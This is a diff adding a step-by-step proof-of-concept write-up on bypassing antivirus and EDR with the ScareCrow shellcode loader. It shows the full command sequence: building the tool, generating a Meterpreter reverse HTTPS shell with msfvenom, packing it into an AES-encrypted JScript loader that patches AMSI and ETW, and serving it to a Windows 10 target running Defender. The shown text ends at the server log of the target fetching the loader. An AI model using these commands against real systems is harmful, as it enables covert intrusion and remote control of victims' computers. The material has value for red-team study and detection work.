@@ -1,0 +1,148 @@
+=========================================================================================================================================================
+Antivirus/EDR bypass using the shellcode loader 'ScareCrow'
+=========================================================================================================================================================
+
+Source: => https://github.com/optiv/ScareCrow
+
+ScareCrow - Payload creation framework designed around EDR bypass. 
+
+Main features
+-------------
+> AES Encryption (shellcode)
+> Unhook ntdll.dll to bypass EDR detection
+> Use of direct syscalls 
+> AMSI bypass
+> ETW bypass
+> Fake signature coding 
+> ...
+
+
+=========================================================================================================================================================
+PoC - Example with a stageless Meterpreter (x64) https reverse shell running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+=========================================================================================================================================================
+
+--------------------------------------------------------------------------------------------------------
+Step 1 - Download and compile 'ScareCrow'
+--------------------------------------------------------------------------------------------------------
+
+https://github.com/optiv/ScareCrow
+
+jeff@kali:~/Documents/Tools/ScareCrow-main$ go get github.com/fatih/color
+go: downloading github.com/fatih/color v1.13.0
+go: downloading github.com/mattn/go-colorable v0.1.12
+go: downloading github.com/mattn/go-isatty v0.0.14
+go: downloading golang.org/x/sys v0.0.0-20220412015802-83041a38b14a
+
+jeff@kali:~/Documents/Tools/ScareCrow-main$ go get github.com/yeka/zip
+go: downloading github.com/yeka/zip v0.0.0-20180914125537-d046722c6feb
+go: downloading golang.org/x/crypto v0.5.0
+go: downloading golang.org/x/sys v0.4.0
+go: added github.com/yeka/zip v0.0.0-20180914125537-d046722c6feb
+go: added golang.org/x/crypto v0.5.0
+go: upgraded golang.org/x/sys v0.0.0-20220412015802-83041a38b14a => v0.4.0
+
+jeff@kali:~/Documents/Tools/ScareCrow-main$ go get github.com/josephspurrier/goversioninfo
+go: downloading github.com/josephspurrier/goversioninfo v1.4.0
+go: downloading github.com/akavel/rsrc v0.10.2
+jeff@kali:~/Documents/Tools/ScareCrow-main$ 
+
+jeff@kali:~/Documents/Tools/ScareCrow-main$ sudo apt-get install osslsigncode
+[sudo] password for jeff: 
+Sorry, try again.
+[sudo] password for jeff: 
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  cpp-9 dh-elpa-helper dkms hashcat-data libasan5 libavresample4 libc-devtools libc6-dev:i386 libclang1-8 libcroco3 libcrypt-dev:i386 libdav1d5
+  libfaudio0 libgcc-8-dev libigdgmm11 libindicator3-7 libjsoncpp24 libllvm8 libmpx2 libnsl-dev:i386 libnsl2:i386 libobjc-8-dev libodbc1 libodbccr2
+  libomp-8-dev libomp5-8 libpocl2-common libstb0 libstdc++-8-dev libsvtav1enc0 libtirpc-dev:i386 libtirpc3:i386 linux-compiler-gcc-10-x86
+  linux-headers-5.14.0-kali4-amd64 linux-headers-5.14.0-kali4-common linux-headers-5.4.0-kali3-common linux-headers-amd64 linux-kbuild-5.14
+  linux-kbuild-5.4 linux-libc-dev:i386 llvm-8 llvm-8-dev llvm-8-runtime openjdk-11-jre openjdk-8-jre python-babel-localedata python3-babel
+  python3-chameleon python3-flask-babelex python3-repoze.lru python3-waitress python3-webtest python3-zope.component python3-zope.event
+  python3-zope.hookable python3.7 python3.7-minimal virtualbox-guest-dkms virtualbox-guest-utils x11-session-utils xinit xorg-docs-core
+Use 'sudo apt autoremove' to remove them.
+The following NEW packages will be installed:
+  osslsigncode
+0 upgraded, 1 newly installed, 0 to remove and 1547 not upgraded.
+Need to get 49.9 kB of archives.
+After this operation, 151 kB of additional disk space will be used.
+Get:1 http://ftp.free.fr/pub/kali kali-rolling/main amd64 osslsigncode amd64 2.5-3 [49.9 kB]
+Fetched 49.9 kB in 2s (22.9 kB/s) 
+Selecting previously unselected package osslsigncode.
+(Reading database ... 371389 files and directories currently installed.)
+Preparing to unpack .../osslsigncode_2.5-3_amd64.deb ...
+Unpacking osslsigncode (2.5-3) ...
+Setting up osslsigncode (2.5-3) ...
+Processing triggers for kali-menu (2021.2.1) ...
+
+jeff@kali:~/Documents/Tools/ScareCrow-main$ go build ScareCrow.go
+
+jeff@kali:~/Documents/Tools/ScareCrow-main$ ls -al
+total 8276
+drwxr-xr-x  8 jeff jeff    4096 Jan  6 13:49 .
+drwxr-xr-x 50 jeff jeff    4096 Jan  6 13:45 ..
+drwxr-xr-x  2 jeff jeff    4096 Jun 14  2022 Cryptor
+-rw-r--r--  1 jeff jeff     420 Jan  6 13:47 go.mod
+-rw-r--r--  1 jeff jeff    3140 Jan  6 13:47 go.sum
+-rw-r--r--  1 jeff jeff    1071 Jun 14  2022 LICENSE
+drwxr-xr-x  2 jeff jeff    4096 Jun 14  2022 limelighter
+drwxr-xr-x  2 jeff jeff    4096 Jun 14  2022 Loader
+-rw-r--r--  1 jeff jeff     710 Jun 14  2022 main.json
+-rw-r--r--  1 jeff jeff     950 Jan  6 13:48 notes.txt
+-rw-r--r--  1 jeff jeff   18534 Jun 14  2022 README.md
+-rwxr-xr-x  1 jeff jeff 8386751 Jan  6 13:49 ScareCrow
+-rw-r--r--  1 jeff jeff   10783 Jun 14  2022 ScareCrow.go
+drwxr-xr-x  2 jeff jeff    4096 Jun 14  2022 Screenshots
+drwxr-xr-x  2 jeff jeff    4096 Jun 14  2022 Struct
+drwxr-xr-x  2 jeff jeff    4096 Jun 14  2022 Utils
+jeff@kali:~/Documents/Tools/ScareCrow-main$ 
+
+
+--------------------------------------------------------------------------------------------------------
+Step 2 - Generate a stageless Meterpreter (x64) https reverse shell using Msfvenom
+--------------------------------------------------------------------------------------------------------
+
+msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread LHOST=192.168.1.30 LPORT=443 -a x64 -f raw -o meterpreter-x64-reverse-https-raw.bin
+
+
+--------------------------------------------------------------------------------------------------------
+Step 3 - Generate with ScareCrow a "shellcode loader" (.js) embedding our shellcode that is encrypted
+--------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/ScareCrow-main$ ./ScareCrow -I /home/jeff/Documents/Tools/Windows/meterpreter-x64-stageless-reverse-https-raw.bin 
+                                                        -nosign -Loader wscript -sandbox -o ./loaderjfc
+        
+  _________                           _________                       
+ /   _____/ ____ _____ _______   ____ \_   ___ \_______  ______  _  __
+ \_____  \_/ ___\\__  \\_  __ \_/ __ \/    \  \/\_  __ \/  _ \ \/ \/ /
+ /        \  \___ / __ \|  | \/\  ___/\     \____|  | \(  <_> )     / 
+/_______  /\___  >____  /__|    \___  >\______  /|__|   \____/ \/\_/  
+        \/     \/     \/            \/        \/                      
+                                                        (@Tyl0us)
+        “Fear, you must understand is more than a mere obstacle. 
+        Fear is a TEACHER. the first one you ever had.”
+
+[*] Encrypting Shellcode Using AES Encryption
+[+] Shellcode Encrypted
+[+] Patched ETW Enabled
+[+] Patched AMSI Enabled
+[*] Creating an Embedded Resource File
+[+] Created Embedded Resource File With btpanui's Properties
+[*] Compiling Payload
+[+] Payload Compiled
+[*] Creating Loader
+[+] Non Executable file extension detected. Either add the extension ".js" or use the following to execute it (note that this works from a local instance, webdav or fileshare... not a  webserver):
+cscript //E:jscript ./loaderjfc
+[+] Loader Compiled
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Download and execute the shellcode loader on a target Windows 10 laptop (with the MS Defender Antivirus enabled & up-to-date)
+---------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/ScareCrow-main$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.1.113 - - [06/Jan/2023 15:53:14] "GET / HTTP/1.1" 200 -
+192.168.1.113 - - [06/Jan/2023 15:53:16] "GET /loaderjfc HTTP/1.1" 200 -
+
